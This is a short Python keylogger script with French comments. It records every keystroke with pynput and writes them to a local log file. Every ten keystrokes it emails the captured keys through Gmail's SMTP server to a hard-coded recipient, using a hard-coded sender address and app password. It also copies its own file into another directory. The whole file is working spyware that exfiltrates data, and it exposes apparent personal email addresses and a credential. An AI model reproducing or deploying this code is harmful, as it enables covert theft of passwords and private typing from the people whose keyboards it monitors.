import pwd
import smtplib
import sys
from tkinter import Frame
from pynput.keyboard import Key, Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import datetime
import os
import shutil


fichier=str(os.getcwd())+"/"+str(sys.argv[0])
print(fichier)
shutil.copy(fichier, 'do/')

msg = MIMEMultipart()
msg['from'] = "jozacoder@gmail.com"
msg['To'] = "josephzabre@gmail.com"
password = "ufjdhogimslabbyk"
msg['Subject'] = "keylogger-test-premier"
body = "XX"

os.copy_file_range

count = 0
keys = []

def on_press(key):
    global keys, count, body
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:   #si le nombre de mot contenu dans ma liste depasse 10
        count = 0
        write_file(str(keys))
        body = str(keys)
        msg.attach(MIMEText(body, 'html'))
        server =smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(msg['from'],password)
        server.sendmail(msg['from'],msg['To'],msg.as_string())
        server.quit()
        keys = [] #vide ma liste 

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("key") == -1:
                f.write(k)
  
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
















